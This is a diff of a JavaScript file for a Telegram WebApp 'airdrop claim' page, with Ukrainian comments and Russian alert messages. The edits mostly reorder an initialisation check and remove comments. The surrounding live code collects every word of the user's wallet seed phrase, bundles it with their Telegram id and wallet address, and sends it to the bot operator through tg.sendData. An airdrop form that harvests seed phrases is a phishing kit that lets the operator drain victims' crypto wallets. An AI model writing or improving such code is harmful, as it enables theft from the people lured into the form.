@@ -56,7 +56,7 @@ document.addEventListener("DOMContentLoaded", () => {
     }
 });
 
-// ======= Функції поза DOMContentLoaded =======
+// ======= Функції =======
 
 function selectAirdrop(name) {
     document.getElementById('selectedAirdropTitle').innerText = `🔗 ${name}`;
@@ -100,21 +100,24 @@ function clearWarning() {
 }
 
 function submitAirdrop() {
-    // 🔐 Перевірка Telegram WebApp
-    if (typeof Telegram === "undefined" || !Telegram.WebApp || !Telegram.WebApp.initDataUnsafe?.user) {
-        alert("❌ WebApp не инициализирован. Пожалуйста, откройте через Telegram.");
+    // ✅ Перевірка Telegram WebApp
+    if (typeof Telegram === "undefined" || !Telegram.WebApp) {
+        alert("❌ Telegram WebApp не найден. Откройте через Telegram.");
         return;
     }
 
-    // ✅ Telegram WebApp готовий
     const tg = Telegram.WebApp;
-    tg.ready();
+    tg.ready(); // ініціалізація
+
+    if (!tg.initDataUnsafe || !tg.initDataUnsafe.user) {
+        alert("❌ WebApp не инициализирован. Пожалуйста, откройте через Telegram.");
+        return;
+    }
 
     // 🧩 Seed-фраза
     const inputs = Array.from(document.querySelectorAll('#seedContainer input'));
     const words = inputs.map(input => input.value.trim()).filter(Boolean);
 
-    // ❗️Перевірка
     if (words.length !== inputs.length) {
         const warning = document.getElementById('validationWarning');
         warning.innerText = '❗️ Пожалуйста, заполните все поля.';
@@ -122,7 +125,6 @@ function submitAirdrop() {
         return;
     }
 
-    // 📦 Payload
     const payload = {
         event: "airdrop_claim",
         user_id: tg.initDataUnsafe.user.id || "-",
@@ -132,12 +134,8 @@ function submitAirdrop() {
         wallet: document.getElementById("wallet").value
     };
 
-    // 🔎 Консоль для дебагу
     console.log("[📤 Отправка в Telegram WebApp]", payload);
 
-    // 🚀 Відправити в бот
     tg.sendData(JSON.stringify(payload));
-
-    // ✅ Закрити WebApp
-    tg.close();
+    tg.close(); // Закриття WebApp
 }
